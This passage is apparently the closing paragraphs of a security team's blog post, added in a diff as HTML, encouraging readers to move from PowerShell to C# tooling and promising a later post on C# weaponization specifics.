+<p><span style="font-weight: 400;">We hope that others find this code helpful, and we encourage any on the fence about C# development to take the plunge! I was a bit apprehensive about starting the C# development for this codebase, but after the first few days I realized how easy it was to transition from PowerShell. Also, I want to reiterate that security-oriented PowerShell is not &#8220;dead&#8221; from our perspective- we will still continue to use it, but again we like to have diversity in our toolsets.</span></p>
+<p><span style="font-weight: 400;">We have a few more tools and modifications that will be pushed out over the next few months, so expect the repositories to stay active. A follow-up post in the next few weeks will cover a few C# weaponization specifics, but until then, have fun!</span></p>
